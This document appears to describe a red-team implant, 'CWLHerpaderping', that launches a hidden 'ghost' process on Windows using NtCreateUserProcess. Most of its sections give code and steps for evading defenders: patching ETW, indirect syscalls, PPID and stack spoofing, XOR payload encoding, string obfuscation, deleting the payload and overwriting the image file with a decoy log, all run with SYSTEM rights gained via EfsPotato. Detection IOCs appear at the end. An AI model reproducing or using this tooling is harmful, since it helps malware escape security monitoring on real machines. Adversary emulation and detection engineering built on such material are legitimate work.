# Process Herpaderping: Ghost Process via NtCreateUserProcess

## Technique

**MITRE ATT&CK:** T1055 — Process Injection (Herpaderping Variant)

_Herpaderping creates a ghost process by writing a payload PE to a hidden temp file, then launching it via `NtCreateUserProcess` with `THREAD_CREATE_FLAGS_CREATE_SUSPENDED`. Because the primary thread starts suspended, there is a writable window between process creation and thread execution. During this window, the on-disk file backing the in-memory image is overwritten in-place with innocuous decoy content (IIS W3SVC log lines). The running process therefore has no valid on-disk image — forensic reads see an IIS log while the process executes from the original in-memory section. This variant uses a single indirect syscall (`NtCreateUserProcess`) rather than the classic 3-syscall pattern (`NtCreateSection` → `NtCreateProcessEx` → `NtCreateThreadEx`). PPID spoofing is applied via `PS_ATTRIBUTE_PARENT_PROCESS` in the attribute list. This is distinct from Process Doppelgänging (T1055.013), which uses NTFS transactions (TxF) — CWLHerpaderping does **not** use TxF._

## Execution Flow

```
wmain()
 └─ PatchEtw()                         ← B1: suppress ETW (T1562.006) [only if ENABLE_ETW_PATCH defined]
 └─ GetPayloadBuffer()
     ├─ GetFileType(STD_INPUT_HANDLE) → check stdin type
     ├─ MODE 1 (stdin pipe - T1620):
     │   ├─ ReadFile(stdin, 4-byte size)
     │   ├─ VirtualAlloc(size)
     │   └─ ReadFile(stdin, payload)    ← reflective: NO disk file
     └─ MODE 2 (file fallback - T1070.004):
         ├─ CreateFileW(PAYLOAD_PATH)
         ├─ ReadFile → heap buffer
         ├─ [#ifdef ENABLE_PAYLOAD_XOR] XOR decode in-place ← T1027.013
         │     └─ decoded[i] = buf[i] ^ ((0xA3 + i * 0x5B) & 0xFF)
         └─ DeleteFileW(PAYLOAD_PATH)   ← anti-forensic: payload deleted
 └─ Herpaderping(buffer, size)
     ├─ InitSyscallPool / INDIRECT_SYSCALL × 1 ← B2: indirect syscall (NtCreateUserProcess only)
     │     NtCreateUserProcess
     ├─ SealSyscallPool()               ← flip stub page to PAGE_EXECUTE_READ
     ├─ GetTempFileNameW (prefix "HD") → hTemp (SHARE_READ, FILE_ATTRIBUTE_HIDDEN, handle kept open)
     ├─ WriteFile(payload → hTemp) + FlushFileBuffers(hTemp)
     ├─ GetNonJobParent()               ← B3: PPID spoof target (svchost/wininit Session 0)
     ├─ RtlCreateProcessParametersEx(RuntimeBroker.exe) → processParameters
     ├─ Build PS_ATTRIBUTE_LIST         ← PS_ATTRIBUTE_PARENT_PROCESS + PS_ATTRIBUTE_IMAGE_NAME (HD*.tmp NT path)
     ├─ NtCreateUserProcess(..., processParameters, attributeList) [StackSpoof] ← B5: ghost process + SUSPENDED thread
     │     THREAD_CREATE_FLAGS_CREATE_SUSPENDED — primary thread created but not running
     ├─ Full in-place decoy overwrite (while thread is SUSPENDED)
     │     loop IIS log lines via pre-held hTemp → covers ALL payloadSize bytes
     │     (no truncate — active image section blocks SetEndOfFile resize)
     │     FlushFileBuffers(hTemp) + CloseHandle(hTemp)
     │     on-disk file is now 100% IIS log content
     └─ ResumeThread(hThread)           ← ghost process begins execution
```

## Steps Detail

| Step | API / Action | Description |
|------|-------------|-------------|
| 0 | `PatchEtw()` | Patch `ntdll!EtwEventWrite` → `xor eax,eax; ret` — suppress ETW (T1562.006). **Conditional:** only compiled/called when `ENABLE_ETW_PATCH` is defined at build time. |
| 1a | `GetFileType(STD_INPUT_HANDLE)` | Check if stdin is a pipe (reflective mode trigger) |
| 1b-MODE1 | `ReadFile(stdin)` | Read 4-byte size + payload bytes from stdin pipe — **T1620 Reflective Code Loading** (NO disk file) |
| 1b-MODE2 | `CreateFileW` / `ReadFile` | Read payload from `PAYLOAD_PATH` into heap buffer |
| 1c-MODE2 | XOR decode (in-place, conditional) | `decoded[i] = buf[i] ^ ((0xA3 + i * 0x5B) & 0xFF)` — **T1027.013** — only when compiled with `ENABLE_PAYLOAD_XOR`; no-op otherwise |
| 2-MODE2 | `DeleteFileW(PAYLOAD_PATH)` | Delete payload file immediately after read — **T1070.004 File Deletion** |
| 3 | `InitSyscallPool` / `INDIRECT_SYSCALL` × 1 | Resolve SSN for 1 injection-critical NT API: `NtCreateUserProcess`; `SealSyscallPool()` flips stub page to `PAGE_EXECUTE_READ` |
| 4 | `GetTempFileNameW` / `CreateFileW` | Create temp file in `%TEMP%` with prefix `HD`; open with `GENERIC_READ\|GENERIC_WRITE\|SYNCHRONIZE`, `FILE_SHARE_READ`, `FILE_ATTRIBUTE_HIDDEN` — hidden attribute set at creation, before any write; handle held open through process creation to retain write permission for later overwrite |
| 5 | `WriteFile(payload → hTemp)` + `FlushFileBuffers` | Write full payload to temp file; flush to guarantee sector commit before process creation |
| 6 | `GetNonJobParent()` | Enumerate processes; find `svchost.exe` in Session 0 → fallback `wininit.exe` in Session 0; return `PROCESS_CREATE_PROCESS` handle |
| 7 | `RtlCreateProcessParametersEx(RuntimeBroker.exe)` | Build `RTL_USER_PROCESS_PARAMETERS` with `ImagePathName = RuntimeBroker.exe`, `RTL_USER_PROC_PARAMS_NORMALIZED` flag — passed directly as parameter to `NtCreateUserProcess`; no remote write needed |
| 8 | Build `PS_ATTRIBUTE_LIST` | Populate attribute list: `PS_ATTRIBUTE_PARENT_PROCESS` = hParent (svchost handle, PPID spoof); `PS_ATTRIBUTE_IMAGE_NAME` = NT path of `HD*.tmp` (`\??\C:\...\HD*.tmp`) |
| 9 | `NtCreateUserProcess(...)` **[StackSpoof]** with `THREAD_CREATE_FLAGS_CREATE_SUSPENDED` | Create ghost process from `HD*.tmp` image with primary thread **suspended**; `processParameters` supplied via `CreateInfo`; `PS_ATTRIBUTE_IMAGE_NAME` sets image path; `PS_ATTRIBUTE_PARENT_PROCESS` sets PPID to svchost; `NtCreateUserProcess` handles PEB setup internally — no `NtAllocateVirtualMemory` or `NtWriteVirtualMemory` needed |
| 10 | Full in-place decoy overwrite | `SetFilePointer(0)` + `while (totalWritten < payloadSize)` loop writing IIS W3SVC log lines via pre-held `hTemp`; last partial line truncated to fill exactly `payloadSize` bytes in-place; `FlushFileBuffers` + `CloseHandle(hTemp)` — on-disk file is now pure IIS log content |
| 11 | `ResumeThread(hThread)` | Resume suspended primary thread — ghost process begins execution at payload entry point; on-disk `HD*.tmp` shows only IIS log content |

> **Key:** This variant uses the atomic `NtCreateUserProcess` (one indirect syscall) rather than the classic 3-call split (`NtCreateSection` → `NtCreateProcessEx` → `NtCreateThreadEx`). `THREAD_CREATE_FLAGS_CREATE_SUSPENDED` creates the primary thread suspended — this is the writable window for the decoy overwrite, equivalent to the `NtCreateProcessEx`/no-thread gap in the original pattern. Only one indirect syscall stub is built. `NtCreateUserProcess` handles PEB setup internally; no `NtAllocateVirtualMemory` or `NtWriteVirtualMemory` calls are needed. PPID spoofing is applied via `PS_ATTRIBUTE_PARENT_PROCESS` in the attribute list, not as a direct `hParent` parameter.

## Patches Applied

### B1 — ETW Patch (`CWLImplant.cpp`)

**Purpose:** `EtwEventWrite` in `ntdll.dll` is the function EDR sensors hook to receive kernel-originated ETW events (e.g., `NtCreateSection`, `NtCreateProcessEx`). Patching it to `xor eax,eax; ret` suppresses those events for the lifetime of the process.

**Conditional compilation:** The entire `PatchEtw()` function and its call in `main()` are wrapped in `#ifdef ENABLE_ETW_PATCH`. The patch is only active when the binary is built with that preprocessor definition. Without it, ETW suppression is skipped entirely.

```cpp
#ifdef ENABLE_ETW_PATCH
static void PatchEtw()
{
    HMODULE hNtdll = GetNtdllBase();
    PVOID pEtw = RESOLVE_API(hNtdll, EtwEventWrite);
    if (!pEtw) { DBG_PRINT("PatchEtw: EtwEventWrite not resolved, skipping"); return; }
    DWORD old = 0;
    VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);
    memcpy(pEtw, "\x33\xC0\xC3", 3);  // xor eax,eax; ret
    VirtualProtect(pEtw, 4, old, &old);
}
#endif  // ENABLE_ETW_PATCH
```

When compiled with `ENABLE_ETW_PATCH`, called first in `main()` before any NT API, so DC0021 (OS API Execution) telemetry is suppressed for all subsequent calls.

---

### B2 — Indirect Syscalls (`CWLImplant.cpp`, `syscall.h`)

**One** injection-critical API uses an indirect syscall stub built at runtime by `InitSyscallPool`:

```cpp
INDIRECT_SYSCALL(_NtCreateUserProcess, pNtCreateUserProcess, NtCreateUserProcess);
SealSyscallPool();  // flip stub page PAGE_RWX → PAGE_EXECUTE_READ
```

Each stub: `mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11` — the gadget (`syscall;ret`) lives inside `ntdll .text`, so the CPU sees the syscall as originating from `ntdll`, not from the stub page. EDR user-mode hooks in `ntdll` are bypassed.

Non-syscall helpers (`RtlCreateProcessParametersEx`, `RtlInitUnicodeString`, `RtlImageNtHeader`) are resolved via `RESOLVE_API` (EAT-walk), not indirect syscalls.

---

### B3 — PPID Spoofing — `GetNonJobParent()` (`CWLImplant.cpp`)

**Purpose:** `NtCreateUserProcess` inherits session and job-object constraints from the `PS_ATTRIBUTE_PARENT_PROCESS` attribute. On IIS servers, the caller may be inside an IIS Job Object. Using a Session 0 non-PPL process as parent places the ghost in Session 0 with no Job Object.

```cpp
static HANDLE GetNonJobParent()
{
    const wchar_t* targets[] = { OBFWSTR(L"svchost.exe"), OBFWSTR(L"wininit.exe"), NULL };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            for (int i = 0; targets[i]; i++) {
                if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
                    DWORD sid = 0xFFFF;
                    ProcessIdToSessionId(pe.th32ProcessID, &sid);
                    if (sid != 0) continue;  // reject Session 1+ (interactive users)
                    HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
                    if (h) { CloseHandle(hSnap); return h; }
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return GetCurrentProcess();  // fallback: no spoof
}
```

**Why `svchost.exe` first:** On Windows Server 2022, `wininit.exe` and `services.exe` may restrict `PROCESS_CREATE_PROCESS` even from SYSTEM. `svchost.exe` is non-PPL, always in Session 0, and reliably accessible.

**Token note:** `NtCreateUserProcess` inherits the **caller's** token (unlike `NtCreateProcessEx` which inherits the spoofed parent's). Since the caller (`CertEnrollAgent.exe` running as SYSTEM via EfsPotato) carries a SYSTEM token, the ghost process token is correct without any fixup — the PPID spoof affects visual parentage and Session 0 placement, not the inherited token.

---

### B4 — Token Fixup — **Not Required**

No `NtSetInformationProcess(ProcessAccessToken=9)` token fixup is performed. `NtCreateUserProcess` inherits the caller's (`CertEnrollAgent.exe`) token, which is SYSTEM via EfsPotato — the ghost process receives the correct token automatically. The `_NtSetInformationProcess` typedef is retained in `CWLInc.h` for structural completeness but the function is never called.

---

### B5 — Stack Spoofing (`StackSpoof.cpp` / `StackSpoof.h`)

The `NtCreateUserProcess` indirect syscall call is wrapped with `StackSpoofer`:

```cpp
StackSpoofer spoofer(OBFSTR("kernel32.dll"));
spoofer.Activate();
status = pNtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
                               NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
                               processParameters, &createInfo, attributeList);
spoofer.Deactivate();
```

`Activate()` plants a fake return address inside `kernel32.dll` on the stack before the syscall. EDR stack-walk inspection sees the call as originating from `kernel32.dll`, not from the stub page or the PE.

---

### B6 — XOR Payload Decode (`CWLImplant.cpp`, `GetPayloadBuffer` Mode 2)

**Purpose:** On-disk payload file is stored XOR-encoded so it does not have a valid MZ header. The binary decodes it in memory before use, preventing static AV from identifying the file as a PE. **T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File.**

**Conditional compilation:** Entire decode block is wrapped in `#ifdef ENABLE_PAYLOAD_XOR`. Without it, the raw file bytes are used directly.

**Applies to Mode 2 only.** Mode 1 (stdin pipe) receives plain PE bytes — no XOR in the pipe path.

```cpp
#ifdef ENABLE_PAYLOAD_XOR
const BYTE PAYLOAD_XOR_BASE = 0xA3;
const BYTE PAYLOAD_XOR_STEP = 0x5B;
for (size_t i = 0; i < p_size; i++)
    bufferAddress[i] ^= (BYTE)((PAYLOAD_XOR_BASE + i * PAYLOAD_XOR_STEP) & 0xFF);
#endif
```

Formula is self-inverse (XOR): encoding and decoding use the same function. First byte: `0x4D ('M') ^ 0xA3 = 0xEE` — the encoded file does not start with `MZ`.

---

### B7 — String Obfuscation (`obfstr.h`, `CWLImplant.cpp`)

**`OBFSTR` / `OBFWSTR` — position-dependent XOR:**  
All sensitive strings (`"svchost.exe"`, `"wininit.exe"`, `"kernel32.dll"`, `"RuntimeBroker.exe"`, etc.) are encrypted at compile time with `key(i) = (0xA3 + i × 0x5B) & 0xFF`. Position-dependent — single-byte XOR brute-force (FLOSS) cannot recover the plaintext. Each string decrypts to a `thread_local` stack buffer at use-site; no plaintext in `.rdata`.

**`perror` suppression:**

```cpp
#ifndef CWLDEBUG
#undef perror
#define perror(x) ((void)0)
#endif
```

In Release builds, all error-path string literals (`"[-] Failed to initialize indirect syscall pool"`, `"[-] Couldn't resolve SSN for one or more Nt* APIs"`, etc.) are unreferenced and omitted from `.rdata`. Debug builds (`/p:CWLDebug=1`) retain `perror` output.

---

### Combined Effect

| Scenario | Ghost PPID | Ghost Session | Ghost Token |
|---|---|---|---|
| No patches | `CertEnrollAgent.exe` | Inherited from caller | Inherited from caller (SYSTEM) |
| PPID patch (current) | `svchost.exe` | Session 0 | **Inherited from caller (SYSTEM)** — `NtCreateUserProcess` inherits the caller's token |

> `NtCreateUserProcess` inherits the **caller's** token. Since the caller (`CertEnrollAgent.exe`) runs as SYSTEM via EfsPotato, the inherited token is correct. The PPID spoof (`PS_ATTRIBUTE_PARENT_PROCESS` = svchost) controls visual parentage and Session 0 placement only — it does not affect token inheritance.

## Payload Loading Modes

### Mode 1: Reflective Loading via Stdin (T1620)

**Trigger:** Parent process spawns `CertEnrollAgent.exe` with stdin pipe redirection

**Example (Node.js):**
```javascript
const result = child_process.spawnSync(
    'C:/ProgramData/CertEnrollAgent.exe',
    [],
    { input: payloadBuffer } // stdin redirected with PE bytes
);
```

**Payload format:** 4-byte little-endian size header + PE file bytes

**Key benefit:** Payload **never written to disk** - loaded directly into memory from pipe

**ATT&CK:** T1620 Reflective Code Loading

### Mode 2: File-based Loading with Deletion (T1070.004)

**Trigger:** Stdin is not a pipe (normal console or file handle)

**Default compile-time path (`CWLImplant.cpp`):**

```cpp
#ifndef PAYLOAD_PATH
#define PAYLOAD_PATH L"C:\\ProgramData\\CertCA.bin"
#endif
```

**Override at build time via MSBuild (used in emulation plan):**

```powershell
msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 `
    /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin" /t:Rebuild /m
```

**Key behavior:** Payload read from disk then **immediately deleted** via `DeleteFileW`

**ATT&CK:** T1070.004 Indicator Removal: File Deletion

**Emulation plan usage:**
- Mode 2 (file-based) is the primary path when spawned by EfsPotato as SYSTEM with no stdin pipe; reads `CertCA.bin` (XOR-decoded if built with `ENABLE_PAYLOAD_XOR`) then deletes it
- Mode 1 (reflective) is the alternate path when react2shell spawns the binary with `[4-byte LE size][PE bytes]` on stdin

## Payload Requirements

- Format: Portable Executable (.exe), not raw shellcode
- Architecture: x64
- Entry point: Standard PE entry point (`AddressOfEntryPoint`)
- Self-contained: no external DLL dependencies at load time

## IOCs for Detection

### Mode 1 (Reflective Loading) Indicators:
- Parent process spawns the loader with stdin pipe containing `[4-byte LE size][PE bytes]`
- `GetFileType(STD_INPUT_HANDLE)` returns `FILE_TYPE_PIPE` in the loader process
- **No payload file on disk** — payload transferred entirely via pipe
- Process creation event shows stdin redirection

### Mode 2 (File-based) Indicators:
- `CreateFileW` + `ReadFile` on payload path (e.g., `C:\ProgramData\CertCA.bin`)
- `DeleteFileW` called immediately after read — file creation followed by deletion within seconds
- Payload file exists briefly then disappears

### XOR Decode (Mode 2, `ENABLE_PAYLOAD_XOR` only):
- Payload file on disk (`CertCA.bin`) does **not** start with `MZ` (first byte = `0xEE`)
- In-memory payload is a valid PE after decode — discrepancy between on-disk bytes and in-process memory
- `CertCA.bin` → `0xEE` first byte; decoded buffer → `0x4D` (`M`) first byte

### Common Indicators (Both Modes):
- Process whose on-disk image (`HD*.tmp`) contains IIS W3SVC log content that does not match the in-memory image
- `NtCreateUserProcess` called with `THREAD_CREATE_FLAGS_CREATE_SUSPENDED`; thread resumes after decoy overwrite — single-syscall herpaderping variant (no `NtCreateSection`, no `NtCreateProcessEx`)
- `ProcessParameters.ImagePathName` = `RuntimeBroker.exe` while the actual image loaded is from `HD*.tmp`
- PPID of ghost process resolves to `svchost.exe` or `wininit.exe` in Session 0 despite the real parent being a non-service process
- Stack return address in `kernel32.dll` for the `NtCreateUserProcess` syscall (fake return planted by StackSpoofer)
- `EtwEventWrite` in `ntdll` patched to `xor eax,eax; ret` in calling process memory (only when built with `ENABLE_ETW_PATCH`)
- `HD*.tmp` created in `%TEMP%` with `FILE_ATTRIBUTE_HIDDEN` — not visible in Explorer or basic `dir` output; MFT enumeration (`dir /ah`, `Get-ChildItem -Hidden`, Sysmon EID 11) required to observe
- `HD*.tmp` written with payload, overwritten with IIS log content — file stays on disk (active image section blocks deletion)
- API sequence: `RtlCreateProcessParametersEx(RuntimeBroker.exe)` → build `PS_ATTRIBUTE_LIST` → `NtCreateUserProcess` (suspended) → decoy overwrite → `ResumeThread`
- **No file deletion** of the temp file — `STATUS_CANNOT_DELETE (0xC0000121)` when active image section is mapped; file remains on disk with full IIS log content

## Log Sources Coverage

| Data Component | Log Source | Channel/Event | Notes |
|---|---|---|---|
| Process Creation (DC0032) | WinEventLog:Sysmon | EventCode=1 | ❌ Ghost process — `ImageFileName` shows `RuntimeBroker.exe` but on-disk file is IIS log content |
| Process Access (DC0035) | WinEventLog:Sysmon | EventCode=10 | ✅ Yes — process open events visible for `NtCreateProcessEx` parent handle operations |
| File Creation (DC0016) | WinEventLog:Sysmon | EventCode=11 | ✅ `HD*.tmp` created with `FILE_ATTRIBUTE_HIDDEN`; overwritten with decoy; stays on disk — hidden from basic dir/Explorer, visible via Sysmon EID 11 or `dir /ah` |
| OS API Execution (DC0021) | ETW:Microsoft-Windows-Kernel-Process | `NtCreateUserProcess` | ⚠️ Suppressed only when binary compiled with `ENABLE_ETW_PATCH`; visible otherwise |
| Thread Creation (DC0019) | WinEventLog:Sysmon | EventCode=8 | ✅ Primary thread created atomically by `NtCreateUserProcess` (not a separate cross-process `NtCreateThreadEx`); `ResumeThread` resumes the suspended thread — no remote thread injection event; thread visible in process creation telemetry only |
